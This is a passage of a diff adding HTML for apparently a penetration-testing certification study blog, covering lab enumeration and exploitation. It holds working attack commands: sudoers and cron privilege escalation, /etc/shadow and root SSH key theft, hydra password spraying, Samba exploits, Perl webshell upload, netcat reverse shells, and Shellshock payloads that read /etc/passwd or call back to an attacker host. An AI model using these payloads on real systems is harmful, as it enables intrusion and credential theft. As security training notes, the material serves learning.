+<h4 id="additional-resources">Additional Resources</h4>
+
+<ul>
+  <li>
+    <p>Local Linux Enumerating &amp; Privilege Escalation CheatSheet:
+  https://web.archive.org/web/20200218150604/https:/www.rebootuser.com/?p=1623</p>
+  </li>
+  <li>
+    <p>Basic Linux Privilege Escalation:
+  https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</p>
+  </li>
+  <li>
+    <p>Local Unix PrivEsc Aggregation - FuzzySecurity (Kernel Exploits):
+  https://github.com/FuzzySecurity/Unix-PrivEsc</p>
+  </li>
+</ul>
+
+<h4 id="extra----privesc">extra [+] - privesc</h4>
+<p>run LinuxPrivChecker
+example:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sudoer
+	user ALL=(root) NOPASSWD: /usr/bin/apt edit-sources ../*
+
+sudo /usr/bin/apt edit-sources ../../../../tmp/foo 
+option 3 = vim.basic
+:!sh
+
+</code></pre></div></div>
+
+<blockquote>
+  <p>we have root access</p>
+</blockquote>
+
+<p>Summary regarding our network state:</p>
+
+<p><img src="/assets/images/posts/2023-11-19-ecppt/23.png" alt="Alt text" class="align-center" /></p>
+
+<p>Summary regarding our System information:</p>
+
+<p><img src="/assets/images/posts/2023-11-19-ecppt/24.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/2023-11-19-ecppt/25.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/2023-11-19-ecppt/26.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/2023-11-19-ecppt/27.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/2023-11-19-ecppt/28.png" alt="Alt text" class="align-center" /></p>
+
+<h2 id="lab-1---linux-exploitation-remote-enumeration">Lab 1 - Linux Exploitation (Remote Enumeration)</h2>
+
+<p>Scope: The scope is limited to the following domain and netblock:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Netblock: 172.16.80.1/24
+
+Domain: robotstogo.localdomain
+</code></pre></div></div>
+
+<blockquote>
+  <p>Lab under maintenance - and I dont have pacience to wait
+So ill just study, and do the lab later, why am I writing this? anyway</p>
+</blockquote>
+
+<h3 id="task-1---identify-operating-systems-portsservices-and-versions">Task 1 - Identify Operating Systems, Ports/Services and Versions</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sT -O -sV --version-all 172.16.80.1/24
+</code></pre></div></div>
+
+<p>// Host // Operating System // Ports - banner</p>
+
+<p>172.16.80.22</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Linux 2.6.X
+
+22 OpenSSH 4.7p1
+80 Apache httpd 2.2.8
+139 Samba 3.x
+443 Apache httpd 2.2.8
+445 Samba 3.x
+512 tcpwrapped
+1999 rmiregistry
+8180 Apache Tomcat
+37179 rmiregistry
+46079 rmiregistry
+46732 mountd
+47070 status
+54202 nlockmgr
+---------------------------------------------------------------------
+172.16.80.24
+
+Linux 2.6.32
+
+4433 nginx 1.1.19
+8080 Apache Tomcat JSP
+Engine
+---------------------------------------------------------------------
+172.16.80.26
+
+Unix
+
+21 vsftpd 2.3.4
+---------------------------------------------------------------------
+172.16.80.27
+
+Linux 3.2
+
+22 OpenSSH 7.6p1
+25 Sendmail 8.15.2
+79 Linux fingerd
+80 nginx 1.13.8
+111 rpcbind
+139 Samba 3.x
+445 Samba 3.x
+587 Sendmail 8.15.2
+2049 nfs_acl
+32931 nlockmgr
+34457 mountd
+37437 mountd
+48797 mountd
+60666 unknown
+</code></pre></div></div>
+
+<h3 id="task-2---enumerate-any-smtp-servers-for-enabled-methodsverbs-and-users">Task 2 - Enumerate any SMTP Servers for Enabled Methods/Verbs and Users</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script smtp-commands 172.16.80.27 -p 25
+nc 172.16.80.27 25
+</code></pre></div></div>
+
+<p>// SMTP Server IP // Enabled Methods
+172.16.80.27 - HELO, EHLO, MAIL, RCPT, DATA, RSET NOOP, QUIT, HELP, VRFY, EXPN, VERB, ETRN, DSN, AUTH</p>
+
+<h3 id="task-3---enumerate-the-samba-server-for-version-users-available-shares-and-content">Task 3 - Enumerate The Samba server For Version, Users, Available Shares and Content</h3>
+
+<p>// obtain a list of local users</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux -r 172.16.80.22 | grep "Local User"
+enum4linux -r 172.16.80.27 | grep "Local User"
+</code></pre></div></div>
+
+<p>// identify shares and permissions</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap -H 172.16.80.22
+smbmap -H 172.16.80.27
+</code></pre></div></div>
+
+<p>// the system allows anonymous or guest access?</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script smb-enum-shares 172.16.80.22 -p 445
+</code></pre></div></div>
+
+<p>// no useful results here, so we may try to connect without password with smbclient (-N option)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -N \\\\172.16.80.22\\tmp -U ""
+</code></pre></div></div>
+
+<p>In SMB shell:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls = to list directories
+</code></pre></div></div>
+
+<p>// lets try the second machine</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script smb-enum-shares 172.16.80.27 -p 445
+
+smbclient -N \\\\172.16.80.27\\web -U ""
+ls
+</code></pre></div></div>
+
+<p>// To obtain the samba version and operating system</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script smb-os-discovery 172.16.80.22 -p 445
+nmap --script smb-os-discovery 172.16.80.27 -p 445
+</code></pre></div></div>
+
+<h3 id="task-4---identify-nfs-shares-and-content">Task 4 - Identify NFS Shares and Content</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script nfs-ls 172.16.80.27
+</code></pre></div></div>
+<p>// we discovered that there is /home/simon being exported and contains a backup.zip</p>
+
+<h3 id="task-5---execute-a-nmap-vulnerability-script-scan-against-dicovered-hostsports">Task 5 - Execute a Nmap Vulnerability Script Scan against Dicovered Hosts/Ports</h3>
+<ul>
+  <li>Important: With the Nmap scans that follows, notice we are using a “+” character before the “vuln” category For the NSE script scan; this will force Nmap to conduct vulnerability scans against *non-standard ports.</li>
+  <li>Confucting this type of scan against a large set of ports, will take a very long time; Also, it will generate a lot of noise.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script +vuln -p 80,1999,8180,35316 172.16.80.22
+nmap --script +vuln -p 4433 172.16.80.24
+nmap --script +vuln -p 2049,445,80,60666 172.16.80.27
+</code></pre></div></div>
+
+<h3 id="task-6---identify-services-that-can-be-used-to-enumerate-users">Task 6 - Identify Services That Can be Used to enumerate Users</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.16.80.22:
+	SMB / 445 / Using enum4linux script or rpcclient
+
+172.16.80.27:
+	SMTP / 25 / Using smtp-user-enum script or manually
+	FINGERD / 79 / finger root@172.16.80.27 (can be automated with a “For loop”.)
+	SMB / 445 / Using enum4linux script or rpcclient
+</code></pre></div></div>
+
+<h2 id="lab-2---linux-exploitation-local-enumeration">Lab 2 - Linux Exploitation (Local Enumeration)</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Machine IP: 172.16.80.27
+ip: 172.16.80.5
+Username: lowpriv
+Password: l0wpr1vx80#
+</code></pre></div></div>
+
+<h3 id="task-1---enumerate-for-suid-executables">Task 1 - Enumerate for SUID Executables</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -4000 2&gt;/dev/null
+
+/sbin/mount.nfs
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/eject/dmcrypt-get-device
+/usr/sbin/vudo
+/usr/sbin/sensible-mda
+/usr/sbin/pppd
+/usr/bin/chsh
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/bwrap
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/procmail
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/kismet_capture
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/local/bin/catme
+/bin/umount
+/bin/ntfs-3g
+/bin/fusermount
+/bin/su
+/bin/ping
+/bin/mount
+</code></pre></div></div>
+
+<ul>
+  <li>here is 2 files that we can try
+  /usr/sbin/vudo
+  /usr/local/bin/catme
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/sbin/vudo -h
+vudo - safely edit the sudoers file
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>usage: vudo [-chqsV] [-f sudoers] [-x output_file]</p>
+
+<p>Options:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  -c, --check              check-only mode
+  -f, --file=sudoers       specify sudoers file location
+  -h, --help               display help message and exit
+  -q, --quiet              less verbose (quiet) syntax error messages
+  -s, --strict             strict syntax checking
+  -V, --version            display version information and exit
+  -x, --export=output_file write sudoers in JSON format to output_file
+</code></pre></div></div>
+
+<h3 id="we-can-use-this-vudo-file-to-edit-the-sudoer-file">we can use this vudo file to edit the sudoer file</h3>
+<p>// so we can add our user there</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/sbin/vudo -f /etc/sudoers
+	lowpriv ALL=(root) NOPASSWD: ALL
+	:wq!
+	sudo bash
+</code></pre></div></div>
+
+<blockquote>
+  <p>Pwned!</p>
+</blockquote>
+
+<h3 id="back-to-lowpriv-user---task-2">back to lowpriv user - Task 2</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /etc/cron* -type f -perm -o+w -exec ls -l {} \;
+// the command will search For files that are writeable by everyone
+	-rwxrwxrwx 1 root root 47 Feb 21  2018 /etc/cron.hourly/oddjob
+</code></pre></div></div>
+
+<ul>
+  <li>we have write access</li>
+  <li>lets copy the shadow file to tmp/shadow</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo -e '\#!/bin/bash\n/bin/cat /etc/shadow &gt; /tmp/shadow' &gt; /etc/cron.hourly/oddjob
+</code></pre></div></div>
+
+<ul>
+  <li>in the min 17 of every hour, as the crontab shows…</li>
+  <li>our command will be executed, so the shadow will be copied to the temp folder</li>
+</ul>
+
+<h3 id="another-method">another method</h3>
+<ul>
+  <li>we have access to the /root folders, but we cant list files</li>
+  <li>we can see that .ssh exists, but we cant access</li>
+  <li>we cant access, but we can try to access the file id_rsa inside the .ssh</li>
+  <li>that is a common file</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /root/.ssh/id_rsa
+</code></pre></div></div>
+
+<p>// we have the RSA PRIVATE KEY
+// to access the ssh</p>
+
+<p>// check if the public key authentication is available</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/ssh/sshd_config | grep Pub
+	PubkeyAuthentication yes
+</code></pre></div></div>
+
+<ul>
+  <li>create a .ssh in the user /home folder</li>
+  <li>copy the id_rsa file to this folder</li>
+  <li>and give the property permission</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /home/lowpriv/
+mkdir .ssh
+cp /root/.ssh/id_rsa /home/lowpriv/.ssh/.
+chmod 600 id_rsa
+</code></pre></div></div>
+
+<p>// now we can access the root@localhost via ssh</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -i /home/lowpriv/.ssh/id_rsa root@localhost
+</code></pre></div></div>
+
+<h3 id="2nd-time">2nd time</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grep -nri "/tmp/message" /usr
+printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" &gt;&gt; /etc/sudoers'
+</code></pre></div></div>
+
+<h1 id="exploitation-over-the-network">Exploitation over the Network</h1>
+
+<h2 id="password-spray-attack">Password Spray Attack</h2>
+<ul>
+  <li>trying just a single password attempt against tens or hundreds of user accounts.</li>
+  <li>reduces the risk of account lockout</li>
+  <li>help us stay <strong>under the radar</strong></li>
+  <li>
+    <p>aka Reverse-Brute-force attack</p>
+  </li>
+  <li>first we need to gather as many usernames as possible</li>
+  <li>utilizing more than one tool could help us compile an initial user list</li>
+  <li>The Harvester, Statistically likely usernames, etc</li>
+  <li>smtp-user-enum, metasploit has <strong>smtp_enum</strong> module, manual methods as vrfy, expn etc</li>
+</ul>
+
+<h3 id="create-a-user-list">create a user list</h3>
+<ul>
+  <li>using the Statiscally Likely Usernames</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>head -n 50 john.txt &gt;&gt; users.txt
+</code></pre></div></div>
+
+<ul>
+  <li>combine with user that you gathered from other phases of testing</li>
+</ul>
+
+<p>in Metasploit:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	use auxiliary/scanner/smtp/smtp_enum
+	set options
+	// we should get valid users as result, so we must add these in a file valid_users.txt
+</code></pre></div></div>
+
+<ul>
+  <li>now we should determine one or two (maximum) commonly-used passwords</li>
+  <li>the most common its the current season along with the year. e.g., <strong>Spring2018</strong></li>
+  <li>another common password: <strong>CompanyName</strong> + a numerical value, e.g., FooCorp01, FooCorp02</li>
+  <li>Passwords may be reused across systems within an environment as well</li>
+</ul>
+
+<h3 id="determine-services-that-we-can-spray-attack">determine services that we can spray attack</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sT &lt;target ip&gt; --open --max-retries 1 -n
+// ssh, smtp, smb are some services we can try
+</code></pre></div></div>
+
+<h3 id="summary">Summary</h3>
+<ol>
+  <li>Create a list of users gathered through our information gatherins phase, in addition to using usernames from the statistically likely usernames list.</li>
+  <li>Confirmed valid users using SMTP user enumeration with smtp_enum from metasploit scanner module.</li>
+  <li>Created our list of validated user accounts, and a list containing two commonly-used passwords</li>
+  <li>Determine several services on our target machine we can execute our password spray attack against and have decided on SSH.</li>
+</ol>
+
+<h4 id="we-can-execute-the-attack">We can execute the attack</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra - https://github.com/vanhauser-thc/thc-hydra
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> hydra -L users.txt -P passwords.txt ssh://&lt;target ip&gt;
+</code></pre></div></div>
+
+<blockquote>
+  <p>once we have obtained valid credentials For a single user, we can also exploit the common case of <strong>password reuse</strong> within an environment.</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l david -p Spring2018 -M ssh_server.txt ssh
+   // the -M = specify a list of ssh servers we can attack
+</code></pre></div></div>
+
+<ul>
+  <li>metasploit <strong>smb_login</strong> scanner module can be used to obtain similar results For passwords spray attacks against SMB services.</li>
+  <li>this attack are also known to ve very successful against platforms such as Outlook Web Access or Exchange Portals.</li>
+  <li>Metasploit has a module on brute force OWA portals - <strong>owa_login</strong></li>
+  <li>Depending on system configurations, password spray can be detected and thwarted, which its crucial to only attempt one (recommended) to two (maximum) passwords during a single run.</li>
+  <li>after attempting a password spray run, if unsuccessful the first time around, wait 45 minutes and try again with new passwords in your list.</li>
+  <li>multiple attempts within a certain time-range also result in detection and/or lockouts.</li>
+</ul>
+
+<h2 id="exploiting-samba">Exploiting Samba</h2>
+<ul>
+  <li>Typically provides file sharing services to both windows, and linux users.</li>
+  <li>Versions up to 4.6.4 contain vulnerabilities that allow an attacker to take control of an affected server completely;</li>
+  <li>recently seen with CVE-2017-7494, aka <strong>SambaCry</strong></li>
+</ul>
+
+<h3 id="first---identify-samba-and-version">First - Identify Samba and version</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script smb-os-discovery -p 445 &lt;target ip&gt;
+</code></pre></div></div>
+
+<p>// once the version of Samba is known, we can start to investigate exactly which vulnerabilities might be present For that particular version.
+// searchsploit is a tool For this, its a local database of all exploits that can also be found at exploit-db.com</p>
+
+<h3 id="find-an-exploit">find an exploit</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit samba 3.0.20 
+   // with the version we found earlier
+</code></pre></div></div>
+
+<ul>
+  <li>There is a (Username map script command execution) available, and also the metasploit version of the same exploit</li>
+  <li>Moreover about this vulnerability- https://www.samba.org/samba/security/CVE-2007-2447.html</li>
+</ul>
+
+<h3 id="exploit">exploit</h3>
+<p>in metasploit:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	use exploit/multi/samba/usermap_script
+	set options
+	run
+	// we should gain a shell with root access
+</code></pre></div></div>
+
+<h3 id="get-a-better-shell">Get a better shell</h3>
+<ul>
+  <li>even tho we are root, we dont have a decent shell</li>
+  <li>so we can execute a python one liner to gives us a proper PTY (Pseudo TTY)</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c "import pty; pty.spawn('/bin/sh')"
+</code></pre></div></div>
+
+<h3 id="samba-symlink-directory-traversal">Samba Symlink Directory Traversal</h3>
+<ul>
+  <li>This vuln essentially allows an attacker to create a symbolic link to the root (/) partition from a writeable share ultimately allowing For read access to the entire file system outside of the share directory.</li>
+  <li>Can be exploited using a modified “smbclient”, but metasploit contains a module For exploitation as well.</li>
+  <li>pre-requisites, samba server contains a writeable share and widelinks parameter in the smb.conf file is set with a value of “yes”</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap -H &lt;target ip&gt;
+   // determine if you have write access to the shares
+</code></pre></div></div>
+
+<blockquote>
+  <p>after we have determined a writeable share is available</p>
+</blockquote>
+
+<p>in metasploit:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	use auxiliary/admin/smb/samba_symlink_traversal
+	set options
+	set smbtarget &lt;rootfs&gt; // default
+	run
+</code></pre></div></div>
+
+<p>// now we can access the share</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient \\\\&lt;target ip&gt;\\tmp -N
+cd rootfs
+</code></pre></div></div>
+
+<blockquote>
+  <p>notice that, the directory rootfs is created in the writeable share
+we can now, use <strong>get</strong> and <strong>put</strong> commands, to download/upload files into the share.</p>
+</blockquote>
+
+<h3 id="useful-command---tar">useful command - TAR</h3>
+<ul>
+  <li>when conducting post-exploitation tasks using smbclient is the “tar” command.</li>
+  <li>with tar command, we can create an archive of all files within a current directory, For local perusual later.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd etc
+tar c ../tmp/all_files.tar *
+// the above will create a tar archive of the /etc/ directory on the target system to our local systems /tmp directory
+
+ls -als all_files.tar
+to list the copied files
+</code></pre></div></div>
+
+<ul>
+  <li>We can then extract, and start enumerating files For sensitive content, passwords, etc.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar xf /tmp/all_files.tar
+cd /tmp/rootfs
+grep -r "password" * 2&gt;&amp;1 /dev/null
+</code></pre></div></div>
+
+<h3 id="writeable-samba-share-to-remote-command-execution-via-perl-reverse-shell">Writeable Samba Share to Remote Command Execution via Perl Reverse Shell</h3>
+<ul>
+  <li>
+    <p>what to do in a samba server is fully patched, but we have a writeable share available to us?</p>
+  </li>
+  <li>
+    <p>in this scenario, server fully patched, and contains a share named ‘www’, which appears to be possibly configured to allow administrators to easily update an internal web application.</p>
+  </li>
+</ul>
+
+<p>// get the samba version</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script smb-os-discovery -p 445 &lt;target ip&gt;
+</code></pre></div></div>
+
+<p>// get the permission of the shares</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap -H &lt;target ip&gt;
+</code></pre></div></div>
+
+<h3 id="about-our-findings">about our findings</h3>
+<ol>
+  <li>Web roots often contain files specific to a web server configuration and can futhermore be used to obtain credentials to other service , .e.g. MySQL</li>
+  <li>Being able to write to a web root, is even better depending ob the web server configuration; For instance, is PHP installed? Are there any other web server-interpreted languages we can use to our advantage? Can we upload any files to this directory, and how will the web server handle our files? Can we exploit that to obtain remote command execution?</li>
+</ol>
+
+<h3 id="connect">Connect</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient \\\\&lt;target ip&gt;\\www -N
+</code></pre></div></div>
+
+<p>ls
+// the presence of a “.pl” extension indicates that the server is likely configured to process Perl (CGI) programs.
+// grab the file and analyse the code
+get index.pl</p>
+
+<ul>
+  <li>lets check if the port 80 is open</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sT &lt;target ip&gt; --max-retries 1 -n --open
+</code></pre></div></div>
+
+<ul>
+  <li>lets point a browser at our target</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>open &lt;target ip&gt;/index.pl in a browser
+</code></pre></div></div>
+
+<blockquote>
+  <p>we have confirmed that the <strong>www</strong> share is configured on the Samba server, is most likely being used to server the index.pl script and is likely the actual web root For the web server.</p>
+</blockquote>
+
+<ul>
+  <li>make sure we have WRITE permission to the “www” share</li>
+  <li>lets create a file locally and send to the smb share</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/perl
+print "Content-type: text/html\n\n";
+system("id");
+</code></pre></div></div>
+
+<p>//it will execute the id Linux system command and will display your current UID and GID information when accessed with your browser.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	smbclient \\\\&lt;target ip&gt;\\www -N
+	put test.pl
+</code></pre></div></div>
+
+<ul>
+  <li>lets browser to our test.pl file</li>
+</ul>
+
+<p>in browser:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;target ip&gt;/test.pl
+</code></pre></div></div>
+
+<blockquote>
+  <p>this will confirm For us that we can upload our own Perl scripts to the server and can execute remote operating system commands through our test script.</p>
+</blockquote>
+
+<h3 id="reverse-shell---perl">reverse shell - Perl</h3>
+<ul>
+  <li>Now we can use perl-reverse-shell.pl from pentestmonkey</li>
+  <li>
+    <p>in kali: /usr/share/webshells/perl directory
+// just change the ip of the source code
+// and note the port number</p>
+  </li>
+  <li>Upload the script to the share</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient &gt; put 
+</code></pre></div></div>
+
+<ul>
+  <li>open a netcat listener</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 1234
+// -n = no dns
+// -l = listen
+// -v = verbose
+// -p = port we want to listen on
+</code></pre></div></div>
+
+<ul>
+  <li>now we can open the file through the browser
+in browser:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;target ip&gt;/&lt;perl-reverse-shell.pl&gt;
+</code></pre></div></div>
+<p>// we have a shell</p>
+
+<ul>
+  <li>alternatively,
+we could have modified the test.pl that we upload before.
+add in the code:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>system("nc &lt;target ip&gt; 1234 -e /bin/bash");
+</code></pre></div></div>
+
+<h2 id="exploiting-shellshock">Exploiting Shellshock</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aka Bashdoor
+</code></pre></div></div>
+
+<ul>
+  <li>its from september 2014</li>
+  <li>discovered in unix bash shell, and affected CGI programs on web servers;</li>
+  <li>openssh, dhcp clients, and several other attack vectors, e.g. Qmail servers etc</li>
+  <li>resulted in several CVEs being assigned</li>
+</ul>
+
+<h3 id="determine-if-the-system-is-vulnerable">determine if the system is vulnerable</h3>
+<ul>
+  <li>from a local system perspective:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+</code></pre></div></div>
+
+<p>// When executed in a vulnerable bash shell, the string essentially executes an environment variable called <strong>x</strong>.
+// <strong>x</strong> in turn runs the <strong>echo vulnerable</strong> command, which is outside of the environment variable function
+// i.e., outside of the “() { :;};” part of the string</p>
+
+<ul>
+  <li>This was not intended as part of the design of how bash should handle environment variables.</li>
+  <li>On a patched system, the correct output of the above string would simply be <strong>this is a test</strong></li>
+</ul>
+
+<h3 id="primary-attack-vectors">primary attack vectors</h3>
+<ul>
+  <li>one of the primary attack vector that was seen in the wild following the disclosure of shellshock was the modification of User-Agent strings to include Shellshock payloads intended to run commands on the remote server.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-Agent: () { :;}; ping -c 5 -p unique_string attacker.machine
+</code></pre></div></div>
+
+<blockquote>
+  <p>if the attacker system receives the unique payload string, then this serves as confirmation that the system ran the ping command.</p>
+</blockquote>
+
+<p>dirsearch - https://github.com/maurosoria/dirsearch</p>
+<ul>
+  <li>
+    <p>Is similar to some other tools you may be familiar with such as <strong>dirb</strong> or <strong>dirbuster</strong> and is used to execute dictionary-type attacks against web servers in search For interesting files, directories, etc.</p>
+  </li>
+  <li>
+    <p>In order to find some CGI programs on a web server, we are going to utilize:
+// -e =  extensions 
+// -r = recursive</p>
+  </li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./dirsearch.py -u http://&lt;target ip&gt;/ -e cgi -r
+</code></pre></div></div>
+
+<p>discovered:
+// cgi-bin directory
+// login.cgi file
+// we can access the login.cgi</p>
+
+<p>open the file in the browser</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;target ip&gt;/cgi-bin/login.cgi
+</code></pre></div></div>
+
+<h3 id="identify-wheter-or-not-the-cgi-program-is-vulnerable-to-shellshock">identify wheter or not the .cgi program is vulnerable to shellshock</h3>
+<ul>
+  <li>we can use <strong>http-shellshock</strong> Nmap NSE script For this.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script http-shellshock --script-args uri=/cgi-bin/login.cgi &lt;target ip&gt; -p 80
+</code></pre></div></div>
+<p>// its likely vulnerable</p>
+
+<h3 id="ways-to-exploit">Ways to Exploit</h3>
+<ul>
+  <li>There are multiple ways to exploit shellshock to gain control over a system.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget -U "() { foo;}echo \"Content-type: text/plain\"; echo; /bin/cat /etc/passwd" http://&lt;target ip&gt;/cgi-bin/login.cgi &amp;&amp; cat login.cgi
+</code></pre></div></div>
+<p>// we should get the /etc/passwd of the target</p>
+
+<p>// wget will issue a GET request to the target system, use a Shellshock-ified User-Agent(-U) to echo the contents of /etc/passwd to a local file on our attacker system (login.cgi), and will then display its contents to us (&amp;&amp; cat login.cgi)</p>
+
+<ul>
+  <li>Now that we confirmed that we can execute commands on the remote system, we can use that to our advantage.</li>
+</ul>
+
+<p>-set up a handler</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 1234
+</code></pre></div></div>
+
+<ul>
+  <li>set up the wget command with a reverse shell</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget -U "() { foo;echo; /bin/nc &lt;kali ip&gt; 1234 -e /bin/sh" http://&lt;target ip&gt;//cgi-bin/login.cgi
+</code></pre></div></div>
+
+<blockquote>
+  <p>if everything is correct, we should gain a reverse shell from our handler</p>
+</blockquote>
+
+<h2 id="exploiting-heartbleed">Exploiting Heartbleed</h2>
+
+<ul>
+  <li>Heartbleed, 2014, was a critical bug affecting OpenSSL versions 1.0.1 through 1.0.1f and allowed For the reading of encrypted data stored in memory due to a faulty implementation of the TLS (Transport Layer Security) and DTLS (Datagram Transport Layer Security) protocols heartbeat extension.</li>
+</ul>
+
+<h3 id="verify-a-vulnerable-openssl-implementation">Verify a vulnerable OpenSSL implementation</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script ssl-heartbleed &lt;target ip&gt;
+</code></pre></div></div>
+<h3 id="after-confirmed-we-can-use-metasploit">After confirmed, we can use metasploit</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/ssl/openssl_heartbleed
+set action DUMP
+set other options
+run
+// metasploit will store the result in ~/.msf4/loot directory as .bin file
+</code></pre></div></div>
+
+<h3 id="check-the-results">check the results</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings &lt;file.bin&gt;
+</code></pre></div></div>
+
+<p>// in this case, the username and password was leaked</p>
+
+<blockquote>
+  <p>[+] if you dont get any leaked data from your first run, try again.</p>
+</blockquote>
+
+<h2 id="exploiting-java-rmi-registry">Exploiting Java RMI Registry</h2>
